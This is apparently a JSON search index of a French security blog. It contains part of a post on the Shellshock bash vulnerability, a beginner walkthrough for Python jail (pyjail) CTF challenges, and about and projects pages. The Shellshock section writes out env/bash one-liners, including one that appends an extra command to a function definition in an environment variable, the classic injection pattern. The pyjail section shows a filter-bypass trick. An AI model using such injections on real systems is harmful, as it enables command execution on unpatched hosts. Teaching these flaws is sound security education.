aussi déclarer une fonction : $ env my_function=\u0026#39;() { echo \u0026#34;aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==\u0026#34; | base64 -d; }\u0026#39; On peut même les utiliser dans un sous-shell :\n$ env my_function=\u0026#39;() { echo \u0026#34;aHR0cHM6Ly9ncGguaXMvMWEzWDV0UQ==\u0026#34; | base64 -d; }\u0026#39;; bash -c \u0026#39;my_function;\u0026#39; L\u0026rsquo;utilisation de variables d\u0026rsquo;environnement dans des sous-shells a été supprimée depuis, mais si vous voulez quand même tester, Docker ou VM 😉\nInjection # La partie sympa de Shellshock, c\u0026rsquo;est qu\u0026rsquo;on pouvait injecter une commande à exécuter via les variables d\u0026rsquo;environnement, en ajoutant la commande à la suite de la déclaration d\u0026rsquo;une fonction :\n$ env a=\u0026#39;() { echo \u0026#34;This is my function\u0026#34;; }; echo \u0026#34;Not in the func\u0026#34;\u0026#39;; bash -c \u0026#39;a;\u0026#39; Not in the func # Ne devrait pas être appelé ! This is my function Donc ouais, Shellshock c\u0026rsquo;est quand même vachement cool 😎.\n","date":"28 February 2020","permalink":"/posts/la-vuln%C3%A9rabilite-shellshock/","section":"Posts","summary":"Shellshock est une vulnérabilité présente dans bash 4.","title":"La vulnérabilité Shellshock"},{"content":"","date":"28 February 2020","permalink":"/tags/web/","section":"Tags","summary":"","title":"web"},{"content":"","date":"9 March 2019","permalink":"/tags/jail/","section":"Tags","summary":"","title":"jail"},{"content":" Introduction # Tout d\u0026rsquo;abord qu\u0026rsquo;est-ce qu\u0026rsquo;une \u0026lsquo;pyjail\u0026rsquo; ? Il s\u0026rsquo;agit le plus souvent d\u0026rsquo;un environnement Python 🐍 restreint, c\u0026rsquo;est-à-dire que (comme pour les autres types de \u0026lsquo;jails\u0026rsquo;) certaines fonctions, classes ont été supprimées, ou sont filtrées lors du traitement de l\u0026rsquo;input utilisateur pour bloquer l\u0026rsquo;attaquant.\nCes environnements restreints sont présents lors de CTFs mais c\u0026rsquo;est une catégorie qui nécessite un peu de connaissances avant de s\u0026rsquo;y lancer, mais sont aussi utilisés dans des milieux professionnels afin d\u0026rsquo;éviter de donner l\u0026rsquo;accès à tout le système si un attaquant arrive à entrer sur un serveur SSH par exemple.\nUn peu de pratique # Avec l\u0026rsquo;aide d\u0026rsquo;un cobaye pour le test, qui se reconnaîtra, j\u0026rsquo;ai réalisé quelques pyjails qui permettent de mieux appréhender le langage Python, mais aussi de développer une méthodologie de résolution.\nNous allons voir comment résoudre une jail des plus basiques ensemble, ensuite vous serez libres d’approfondir vos connaissances avec d\u0026rsquo;autres jails que j\u0026rsquo;ai réalisé, et si le cœur vous en dit vous pouvez même tenter de flag les jails sur Root-Me 😊.\nAvant de commencer # Vérifiez bien d\u0026rsquo;avoir Python 3 d\u0026rsquo;installé sur votre machine, puis téléchargez cette archive zip qui contient l\u0026rsquo;environnement de travail adéquat pour résoudre toutes les jails. Cette archive contient un fichier flag.txt qui est lu par toutes les jails lorsque vous avez réussi le challenge, vous devez alors laisser les fichiers jail*.py dans le même dossier.\nPour démarrer # Au préalable, décompressez le fichier zip :\nmkdir jails; unzip jails.zip -d jails/; cd jails Pour lancer une jail de votre choix vous avez simplement à l\u0026rsquo;exécuter avec Python :\npython3 jail1.py Note : les jails sont classées par difficulté croissante, on a alors jail1 plus simple que jail3\nAu boulot ! # Passons à la réalisation de la jail 1. Le but est de finir le challenge sans lire le code source du fichier, mais si vous êtes bloqué plusieurs heures n\u0026rsquo;hésitez pas à y jeter un coup d’œil rapide.\nPremier lançement # Pour nous échapper de cette prison nous allons devoir étudier comment fonctionne le programme. On lance la jail1 :\nTests # Effectuons quelques tests afin de déterminer ce que l\u0026rsquo;on peut faire dans cet environement restreint :\nOn peut voir que les opérations usuelles (calculs, affichage, variables\u0026hellip;) sont autorisées, essayons sd\u0026rsquo;appeler la méthode flag() afin de sortir :\nPas de chance, rien ne se passe, pourtant on voit bien que flag est une fonction, on devrait être en mesure de l\u0026rsquo;apeller, comme pour print() par exemple.\nIl doit se passer quelque chose entre le moment où l\u0026rsquo;on entre la commande et l\u0026rsquo;exécution de cette dernière 😔.\nEssayons de déterminer le problème :\nRésolution # On comprend alors que l\u0026rsquo;entrée utilisateur est filtrée : si la chaîne \u0026quot;flag()\u0026quot; est présente, elle est supprimée. Comment y remédier ?\nIl existe une astuce moldave bien connue pour contourner ce filtre, vous connaissez le film Inception ? C\u0026rsquo;est le même principe, sauf que c\u0026rsquo;est pas dans un rêve mais un shell Python.\nEn effet, écrire fflag()lag(), ou flag(flag()), ou toute autre variation permet de contourner le filtre. 🎉🎉\n","date":"9 March 2019","permalink":"/posts/les-pyjails-pour-les-d%C3%A9butants/","section":"Posts","summary":"Introduction # Tout d\u0026rsquo;abord qu\u0026rsquo;est-ce qu\u0026rsquo;une \u0026lsquo;pyjail\u0026rsquo; ?","title":"Les pyjails pour les débutants"},{"content":"","date":"9 March 2019","permalink":"/tags/python/","section":"Tags","summary":"","title":"python"},{"content":" French engineering student in cybersecurity, I like the web, reverse, crafting ELF and assembly.\nI participate in CTFs on my own or with friends. I mostly do the web challenge because this is the easiest when you begin in cybersecurity. 😇\nCTF InterIUT 2020 staff 🏁 Norzh CTF 2021 staff 🧭 FakeCTF staff 🏦 Why this website # The first need of this blog was to help me to remind things as I learn them, and this is a great chance to share my knowledges with others!\nThe idea is to present subjects linked with security, for all levels (beginner to more advanced). I started with common domains, and with time I will share more advanced intel as I learn them.\nMISC # Twitter\nGitHub\nRoot-Me | HacktTheBox | TryHackMe\n","date":"1 January 0001","permalink":"/about/","section":"","summary":"French engineering student in cybersecurity, I like the web, reverse, crafting ELF and assembly.","title":"About"},{"content":"This is the advanced tag. Just like other listing pages in Congo, you can add custom content to individual taxonomy terms and it will be displayed at the top of the term listing. 🚀\nYou can also use these content pages to define Hugo metadata like titles and descriptions that will be used for SEO and other purposes.\n","date":"1 January 0001","permalink":"/tags/advanced/","section":"Tags","summary":"This is the advanced tag.","title":"advanced"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"I made a few projects, some are very interesting, and some are more for learning purposes or testing. I listed here the ones I am the more proud of, but you can get a more exhaustive list by looking here:\nhttps://github.com/OxNinja https://git.fakenews.sh CTF Kit (mirrored on Github) # A CLI tool to automate CTF deployment. Focus on the challenges 🚩\nSQLi lab # A cybersecurity playground to test your 💉 SQL injection skills!\nMonSQL # The French version of the famous MySQL 🇫🇷\n🐧 Linux build 🐍 Python package 💻 PHP library Science in school docs # French documentation websites about science in general, separated by classes and domains:\n📐 Mathematics 🔭 Physics (I talk about Kerbal Space Program too) Some more incomming such as hardware, chemistry, programing\u0026hellip; ","date":"1 January 0001","permalink":"/projects/","section":"","summary":"I made a few projects, some are very interesting, and some are more for learning purposes or testing.","title":"Projects"}]